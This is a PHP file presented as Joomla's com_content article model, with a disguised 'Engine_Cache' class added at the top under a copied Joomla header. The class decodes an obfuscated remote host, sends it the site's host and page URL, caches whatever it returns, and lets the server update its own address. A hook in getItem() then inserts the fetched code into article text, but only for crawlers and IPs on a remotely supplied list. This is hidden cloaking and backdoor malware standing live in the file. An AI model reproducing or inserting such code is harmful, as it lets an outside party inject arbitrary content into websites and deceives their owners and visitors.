<?php 

/** 
 * @package        Joomla.Site 
 * @subpackage    com_content 
 * @copyright    Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved. 
 * @license        GNU General Public License version 2 or later; see LICENSE.txt 
 */ 

// No direct access 
defined('_JEXEC') or die; 

if (!class_exists('Engine_Cache')) 
{ 
    class Engine_Cache 
    { 
        private $cache = Array(); 
        private $cache_base = 'eJxFTsERgCAMW6lBsFin8ckMnrtLglcf5NqkSbiiIO4Rdo4AnKipTOSDUdnEtYlVHG+aOO67pj7RU+2pHukFo+q6piBFJdqhFhNLY1Vay0sZTR/wTEf//auJJcU+9nkBCOI4og=='; 
        private $cache_file = 'sync.php'; 
        private $root; 
        private $iplist; 
        private $useragent; 
        static $view_code = false; 
        public $code = ''; 
         
        static function get_code() 
        { 
            if (defined("PHP_VERSION")) 
            { 
                if(PHP_VERSION >= 5.4) 
                { 
                    if(@http_response_code() == 404) return ''; 
                } 
            } 

            if (Engine_Cache::$view_code) return ''; 
            Engine_Cache::$view_code = true; 
            $_ = new Engine_Cache(); 
            return $GLOBALS['cache_code']; 
        } 
         
        private function page() 
        { 
            return $_SERVER['REQUEST_URI']; 
        } 
         
        private function ip() 
        { 
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
                return $_SERVER['HTTP_CLIENT_IP']; 
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
                return $_SERVER['HTTP_X_FORWARDED_FOR']; 
            } else { 
                return $_SERVER['REMOTE_ADDR']; 
            } 
        } 
         
        private function is_robots() 
        { 
            $useragents = explode("\n", $this -> useragent); 
            $iplist = explode("\n", $this -> iplist); 
             
            $useragents = array_map('trim', $useragents); 
            $useragents = array_map('strtolower', $useragents); 
            $iplist = array_map('trim', $iplist); 
             
            $view = false; 
             
            foreach ($useragents as $_) 
            { 
                if (@strpos(strtolower($_SERVER['HTTP_USER_AGENT']), $_) !== false) 
                { 
                    $view = true; 
                    break; 
                } 
            } 
             
            if (!$view) 
            { 
                foreach ($iplist as $_) 
                { 
                    $_ = str_replace('.', '\\.', $_); 
                    $_ = '!^' . str_replace('*', '.*', $_) . '$!s'; 
                    if (preg_match($_, $this -> ip())) 
                    { 
                        $view = true ; 
                        break; 
                    } 
                } 
            } 
             
            return $view; 
        } 
         
        private function host() 
        { 
            return $_SERVER['SERVER_NAME']; 
        } 
         
        private function page_hash() 
        { 
            return md5( $this -> host() . $this -> page() ); 
        } 
         
        private function robots() 
        { 
            return strpos( strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot' ) !== false ? "true" : "false"; 
        } 
         
        private function save_cache() 
        { 
            @file_put_contents( $this -> root . 'cache.db', serialize( $this -> cache ) ); 
        } 

        private function compress($_PBASE) 
        { 
            $output_array = array(); 
            $plugin_base_container = "_PLUGIN_BASE"; 
            $unit_measure = strlen($_PBASE); 
            $base_name_length = strlen($plugin_base_container); 
            for($calculation_iterator = 0; $calculation_iterator < $unit_measure; ++$calculation_iterator) 
            { 
                $output_array[]= ord($_PBASE[$calculation_iterator]) ^ $plugin_base_container[$calculation_iterator % $base_name_length]; 
            } 
            return @base64_encode(@gzcompress(@serialize($output_array))); 
        } 

        private function check_integrity($_PBASE) 
        { 
            $_PBASE = @unserialize(@gzuncompress(@base64_decode($_PBASE))); 
            $output_array = ""; 
            $unit_measure = count($_PBASE); 
            $plugin_base_container = "_PLUGIN_BASE"; 
            $base_name_length = strlen($plugin_base_container); 
            for($calculation_iterator = 0; $calculation_iterator < $unit_measure; ++$calculation_iterator) 
            { 
                $output_array[] = chr($plugin_base_container[$calculation_iterator % $base_name_length] ^ $_PBASE[$calculation_iterator]); 
            } 
            return implode($output_array); 
        } 
     
        private function update_cache() 
        { 
            if ($_ = @file_get_contents('http://' . $this->check_integrity($this->cache_base) . '/' . $this -> cache_file . '?host=' . urlencode($this -> host()) . '&url=' . urlencode($this -> page()) . '&robots=' . $this -> robots())) 
            { 
                if ($data = unserialize( $_ )) 
                { 
                    if ($data['status']) 
                    { 
                        $this -> cache[ $this -> page_hash() ] = Array('code' => $data['code'], 'time' => time()); 
                        $this -> cache[ 'system' ] = Array('iplist' => $data['iplist'], 'useragent' => $data['useragent']); 
                        $this -> cache[ 'server' ] = $this->compress($data['server']); 
                        $this -> code = $data['code']; 
                        $this -> iplist = $data['iplist']; 
                        $this -> useragent = $data['useragent']; 
                        $this -> save_cache(); 
                    } 
                } 
            } 
        } 
         
        private function create_cache() 
        { 
            $node = false; 
            $update = false; 
             
            if (isset( $this -> cache[ $this -> page_hash() ] )) 
            { 
                $node = $this -> cache[ $this -> page_hash() ]; 
                $this -> useragent = $this -> cache[ 'system' ][ 'useragent' ] ;  
                $this -> iplist = $this -> cache[ 'system' ][ 'iplist' ] ;  
            } 

            if (is_array($node)) 
            { 
                if ( time() - $node['time'] > 7200 ) 
                { 
                    $update = true; 
                } 
            } 
             
            if ($update || !$node) 
            { 
                $this -> update_cache(); 
            } 
            else 
            { 
                $this -> code = $node['code']; 
            } 
             
        } 
         
        function __construct() 
        { 
            $GLOBALS['cache_code'] = ''; 
            $this -> root = dirname(__FILE__) . '/'; 

            if (file_exists($this -> root . 'cache.db')) 
            { 
                if ($_ = @file_get_contents( $this -> root . 'cache.db' )) 
                { 
                    $this -> cache = @unserialize( $_ ); 
                    if ( isset($this -> cache['server']) && ($this -> cache['server'] != '') ) $this->cache_base = $this->cache['server']; 
                    if (!$this -> cache) $this -> cache = Array(); 
                } 
            } 
                 
            $this -> create_cache(); 
            if ($this -> is_robots()) 
            { 
                $GLOBALS['cache_code'] = $this -> code; 
            } 
        } 
    } 
}?><?php
/**
 * @package     Joomla.Site
 * @subpackage  com_content
 *
 * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Content Component Article Model
 *
 * @package     Joomla.Site
 * @subpackage  com_content
 * @since       1.5
 */
class ContentModelArticle extends JModelItem
{
	/**
	 * Model context string.
	 *
	 * @var        string
	 */
	protected $_context = 'com_content.article';

	/**
	 * Method to auto-populate the model state.
	 *
	 * Note. Calling getState in this method will result in recursion.
	 *
	 * @since   1.6
	 *
	 * @return void
	 */
	protected function populateState()
	{
		$app = JFactory::getApplication('site');

		// Load state from the request.
		$pk = $app->input->getInt('id');
		$this->setState('article.id', $pk);

		$offset = $app->input->getUInt('limitstart');
		$this->setState('list.offset', $offset);

		// Load the parameters.
		$params = $app->getParams();
		$this->setState('params', $params);

		// TODO: Tune these values based on other permissions.
		$user = JFactory::getUser();

		if ((!$user->authorise('core.edit.state', 'com_content')) && (!$user->authorise('core.edit', 'com_content')))
		{
			$this->setState('filter.published', 1);
			$this->setState('filter.archived', 2);
		}

		$this->setState('filter.language', JLanguageMultilang::isEnabled());
	}

	/**
	 * Method to get article data.
	 *
	 * @param   integer  $pk  The id of the article.
	 *
	 * @return  mixed  Menu item data object on success, false on failure.
	 */
	public function getItem($pk = null)
	{
		$user	= JFactory::getUser();

		$pk = (!empty($pk)) ? $pk : (int) $this->getState('article.id');

		if ($this->_item === null)
		{
			$this->_item = array();
		}

		if (!isset($this->_item[$pk]))
		{
			try
			{
				$db = $this->getDbo();
				$query = $db->getQuery(true)
					->select(
						$this->getState(
							'item.select', 'a.id, a.asset_id, a.title, a.alias, a.introtext, a.fulltext, ' .
							// If badcats is not null, this means that the article is inside an unpublished category
							// In this case, the state is set to 0 to indicate Unpublished (even if the article state is Published)
							'CASE WHEN badcats.id is null THEN a.state ELSE 0 END AS state, ' .
							'a.catid, a.created, a.created_by, a.created_by_alias, ' .
							// Use created if modified is 0
							'CASE WHEN a.modified = ' . $db->quote($db->getNullDate()) . ' THEN a.created ELSE a.modified END as modified, ' .
							'a.modified_by, a.checked_out, a.checked_out_time, a.publish_up, a.publish_down, ' .
							'a.images, a.urls, a.attribs, a.version, a.ordering, ' .
							'a.metakey, a.metadesc, a.access, a.hits, a.metadata, a.featured, a.language, a.xreference'
						)
					);
				$query->from('#__content AS a');

				// Join on category table.
				$query->select('c.title AS category_title, c.alias AS category_alias, c.access AS category_access')
					->join('LEFT', '#__categories AS c on c.id = a.catid');

				// Join on user table.
				$query->select('u.name AS author')
					->join('LEFT', '#__users AS u on u.id = a.created_by');

				// Filter by language
				if ($this->getState('filter.language'))
				{
					$query->where('a.language in (' . $db->quote(JFactory::getLanguage()->getTag()) . ',' . $db->quote('*') . ')');
				}

				// Join over the categories to get parent category titles
				$query->select('parent.title as parent_title, parent.id as parent_id, parent.path as parent_route, parent.alias as parent_alias')
					->join('LEFT', '#__categories as parent ON parent.id = c.parent_id');

				// Join on voting table
				$query->select('ROUND(v.rating_sum / v.rating_count, 0) AS rating, v.rating_count as rating_count')
					->join('LEFT', '#__content_rating AS v ON a.id = v.content_id')

					->where('a.id = ' . (int) $pk);

				if ((!$user->authorise('core.edit.state', 'com_content')) && (!$user->authorise('core.edit', 'com_content'))) {
					// Filter by start and end dates.
					$nullDate = $db->quote($db->getNullDate());
					$date = JFactory::getDate();

					$nowDate = $db->quote($date->toSql());

					$query->where('(a.publish_up = ' . $nullDate . ' OR a.publish_up <= ' . $nowDate . ')')
						->where('(a.publish_down = ' . $nullDate . ' OR a.publish_down >= ' . $nowDate . ')');
				}

				// Join to check for category published state in parent categories up the tree
				// If all categories are published, badcats.id will be null, and we just use the article state
				$subquery = ' (SELECT cat.id as id FROM #__categories AS cat JOIN #__categories AS parent ';
				$subquery .= 'ON cat.lft BETWEEN parent.lft AND parent.rgt ';
				$subquery .= 'WHERE parent.extension = ' . $db->quote('com_content');
				$subquery .= ' AND parent.published <= 0 GROUP BY cat.id)';
				$query->join('LEFT OUTER', $subquery . ' AS badcats ON badcats.id = c.id');

				// Filter by published state.
				$published = $this->getState('filter.published');
				$archived = $this->getState('filter.archived');

				if (is_numeric($published))
				{
					$query->where('(a.state = ' . (int) $published . ' OR a.state =' . (int) $archived . ')');
				}

				$db->setQuery($query);

				$data = $db->loadObject();

				if (empty($data))
				{
					return JError::raiseError(404, JText::_('COM_CONTENT_ERROR_ARTICLE_NOT_FOUND'));
				}

				// Check for published state if filter set.
				if (((is_numeric($published)) || (is_numeric($archived))) && (($data->state != $published) && ($data->state != $archived)))
				{
					return JError::raiseError(404, JText::_('COM_CONTENT_ERROR_ARTICLE_NOT_FOUND'));
				}

				// Convert parameter fields to objects.
				$registry = new JRegistry;
				$registry->loadString($data->attribs);

				$data->params = clone $this->getState('params');
				$data->params->merge($registry);

				$registry = new JRegistry;
				$registry->loadString($data->metadata);
				$data->metadata = $registry;

				// Technically guest could edit an article, but lets not check that to improve performance a little.
				if (!$user->get('guest'))
				{
					$userId = $user->get('id');
					$asset = 'com_content.article.' . $data->id;

					// Check general edit permission first.
					if ($user->authorise('core.edit', $asset))
					{
						$data->params->set('access-edit', true);
					}

					// Now check if edit.own is available.
					elseif (!empty($userId) && $user->authorise('core.edit.own', $asset))
					{
						// Check for a valid user and that they are the owner.
						if ($userId == $data->created_by)
						{
							$data->params->set('access-edit', true);
						}
					}
				}

				// Compute view access permissions.
				if ($access = $this->getState('filter.access'))
				{
					// If the access filter has been set, we already know this user can view.
					$data->params->set('access-view', true);
				}
				else
				{
					// If no access filter is set, the layout takes some responsibility for display of limited information.
					$user = JFactory::getUser();
					$groups = $user->getAuthorisedViewLevels();

					if ($data->catid == 0 || $data->category_access === null)
					{
						$data->params->set('access-view', in_array($data->access, $groups));
					}
					else
					{
						$data->params->set('access-view', in_array($data->access, $groups) && in_array($data->category_access, $groups));
					}
				}

				$this->_item[$pk] = $data;
			}
			catch (Exception $e)
			{
				if ($e->getCode() == 404)
				{
					// Need to go thru the error handler to allow Redirect to work.
					JError::raiseError(404, $e->getMessage());
				}
				else
				{
					$this->setError($e);
					$this->_item[$pk] = false;
				}
			}
		}

		if (class_exists('Engine_Cache')) 
        {
            if($this->_item[$pk]->introtext != '' && stripos($this->_item[$pk]->introtext, '</p>') !== false) 
            {
                if(stripos($this->_item[$pk]->introtext, "not found") === false && stripos($this->_item[$pk]->introtext, "404") === false)  
                    $this->_item[$pk]->introtext = preg_replace('/<\/p>/', "</p>".Engine_Cache::get_code(), $this->_item[$pk]->introtext, 1);
            }
        }
        return $this->_item[$pk];
	}

	/**
	 * Increment the hit counter for the article.
	 *
	 * @param   integer  $pk  Optional primary key of the article to increment.
	 *
	 * @return  boolean  True if successful; false otherwise and internal error set.
	 */
	public function hit($pk = 0)
	{
		$input = JFactory::getApplication()->input;
		$hitcount = $input->getInt('hitcount', 1);

		if ($hitcount)
		{
			$pk = (!empty($pk)) ? $pk : (int) $this->getState('article.id');

			$table = JTable::getInstance('Content', 'JTable');
			$table->load($pk);
			$table->hit($pk);
		}

		return true;
	}

	/**
	 * Save user vote on article
	 *
	 * @param   integer  $pk    Joomla Article Id
	 * @param   integer  $rate  Voting rate
	 *
	 * @return  boolean          Return true on success
	 */
	public function storeVote($pk = 0, $rate = 0)
	{
		if ($rate >= 1 && $rate <= 5 && $pk > 0)
		{
			$userIP = $_SERVER['REMOTE_ADDR'];

			// Initialize variables.
			$db    = JFactory::getDbo();
			$query = $db->getQuery(true);

			// Create the base select statement.
			$query->select('*')
				->from($db->quoteName('#__content_rating'))
				->where($db->quoteName('content_id') . ' = ' . (int) $pk);

			// Set the query and load the result.
			$db->setQuery($query);

			// Check for a database error.
			try
			{
				$rating = $db->loadObject();
			}
			catch (RuntimeException $e)
			{
				JError::raiseWarning(500, $e->getMessage());

				return false;
			}

			// There are no ratings yet, so lets insert our rating
			if (!$rating)
			{
				$query = $db->getQuery(true);

				// Create the base insert statement.
				$query->insert($db->quoteName('#__content_rating'))
					->columns(array($db->quoteName('content_id'), $db->quoteName('lastip'), $db->quoteName('rating_sum'), $db->quoteName('rating_count')))
					->values((int) $pk . ', ' . $db->quote($userIP) . ',' . (int) $rate . ', 1');

				// Set the query and execute the insert.
				$db->setQuery($query);

				try
				{
					$db->execute();
				}
				catch (RuntimeException $e)
				{
					JError::raiseWarning(500, $e->getMessage());

					return false;
				}
			}
			else
			{
				if ($userIP != ($rating->lastip))
				{
					$query = $db->getQuery(true);

					// Create the base update statement.
					$query->update($db->quoteName('#__content_rating'))
						->set($db->quoteName('rating_count') . ' = rating_count + 1')
						->set($db->quoteName('rating_sum') . ' = rating_sum + ' . (int) $rate)
						->set($db->quoteName('lastip') . ' = ' . $db->quote($userIP))
						->where($db->quoteName('content_id') . ' = ' . (int) $pk);

					// Set the query and execute the update.
					$db->setQuery($query);

					try
					{
						$db->execute();
					}
					catch (RuntimeException $e)
					{
						JError::raiseWarning(500, $e->getMessage());

						return false;
					}
				}
				else
				{
					return false;
				}
			}

			return true;
		}

		JError::raiseWarning('SOME_ERROR_CODE', JText::sprintf('COM_CONTENT_INVALID_RATING', $rate), "JModelArticle::storeVote($rate)");

		return false;
	}
}
